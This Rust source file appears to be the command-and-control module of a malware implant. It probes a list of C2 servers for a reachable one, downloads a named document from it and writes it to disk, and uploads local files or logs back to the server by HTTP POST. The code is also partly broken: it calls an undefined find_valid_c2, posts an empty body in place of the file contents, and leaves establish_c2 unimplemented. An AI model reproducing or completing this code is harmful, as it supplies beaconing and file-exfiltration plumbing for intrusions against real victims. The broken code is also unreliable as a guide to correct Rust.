use std::{fs::File, io::Write};

// Command and Control logic
use log::{error, info};

// IPv4
type Addr = String;
type Docname = String;

fn get_valid_c2(c2s: Vec<Addr>) -> Result<Addr, ()> {
    // no else needed, this loop has nothing to iterate over
    for addr in c2s {
        // once we find a valid c2 server, stop looking
        if try_callout(&addr).is_ok() {
            return Ok(addr);
        }
    }

    Err(error!("no valid c2 found"))
}

pub fn get_commands(c2s: Vec<Addr>, docname: Docname) {
    if c2s.is_empty() {
        error!("no c2 server specified")
    }

    if let Ok(c2) = find_valid_c2(c2s) {
        download_doc(&c2, &docname);
    }
}

fn blocking_get(addr: &Addr) -> Result<String, ()> {
    info!("blocking get to {addr}");
    if let Ok(response) = reqwest::blocking::get(addr) {
        if let Ok(body) = response.text() {
            Ok(body)
        } else {
            Err(error!("Could not read response body from {addr}"))
        }
    } else {
        Err(error!("No response from {addr}"))
    }
}

fn try_callout(dst: &Addr) -> Result<(), ()> {
    info!("calling out to {dst}");
    match blocking_get(dst) {
        Ok(_) => Ok(info!("successfully called out to {dst}")),
        Err(msg) => Err(error!("{msg:?}")),
    }
}

fn download_doc(addr: &Addr, docname: &Docname) -> Result<(), ()> {
    info!("downloading {:?} from {:?}", docname, addr);
    let mut dst: String = addr.clone();
    dst.push('/');
    dst.push_str(docname);

    match blocking_get(&dst) {
        Ok(body) => {
            try_file_write(docname, &body)?;
            try_file_write(&String::from("./recent.json"), &body)?;
            Ok(info!("downloaded doc {docname} successfully"))
        }
        Err(msg) => Err(error!("{msg:?}")),
    }
}

fn try_file_write(docname: &String, body: &str) -> Result<(), ()> {
    info!("trying file write: {body} to {docname}");
    if let Ok(mut file) = File::create(docname) {
        match file.write_all(body.as_bytes()) {
            Ok(_) => Ok(info!("succesful file write to {docname}")),
            Err(e) => Err(error!("{e}")),
        }
    } else {
        Err(error!("could not save body to {docname}"))
    }
}

fn blocking_post(addr: &Addr, body: String) -> Result<(), ()> {
    info!("blocking get to {addr}");
    let client = reqwest::blocking::Client::new();
    match client.post(addr).body("").send() {
        Ok(resp) => Ok(info!("response from {addr}: {resp:?}")),
        Err(e) => Err(error!("{e}")),
    }
}

fn upload_doc(addr: &Addr, docname: &Docname) -> Result<(), ()> {
    info!("uploading doc {:?} to {:?}", docname, addr);
    if let Ok(body) = std::fs::read_to_string(docname) {
        match blocking_post(&addr, body) {
            Ok(_) => Ok(info!("upload doc to {addr} successful")),
            Err(msg) => Err(error!("{msg:?}")),
        }
    } else {
        Err(error!("could not read from {docname}"))
    }
}

pub fn post_log(c2s: Vec<Addr>, logpath: String) {
    if let Ok(c2) = get_valid_c2(c2s) {
        upload_doc(&c2, &logpath);
    }
}

pub fn establish_c2() -> () {
    todo!("establish c2")
}
